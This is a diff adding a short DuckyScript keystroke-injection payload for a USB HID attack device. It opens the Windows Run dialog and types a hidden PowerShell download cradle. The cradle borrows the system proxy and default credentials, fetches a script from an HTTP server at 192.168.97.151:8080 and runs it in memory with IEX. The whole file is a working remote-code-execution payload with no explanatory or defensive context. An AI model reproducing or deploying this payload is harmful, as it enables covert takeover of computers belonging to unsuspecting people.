@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell.exe -nop -w hidden -c $z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetSystemWebProxy();$z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $z.downloadstring('http://192.168.97.151:8080/sun123');
+ENTER
